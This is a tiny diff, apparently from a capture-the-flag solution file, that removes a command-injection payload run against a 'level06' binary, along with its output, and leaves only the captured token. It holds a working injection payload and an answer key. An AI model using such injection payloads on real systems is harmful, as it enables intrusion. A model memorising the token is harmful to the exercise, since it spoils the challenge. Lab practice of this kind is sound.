@@ -1,2 +1,1 @@
-echo \[x \$\{\`getflag\`\}\] > /tmp/exploit && ./level06 /tmp/exploit
-PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+wiok45aaoguiboiki2tuin6ub
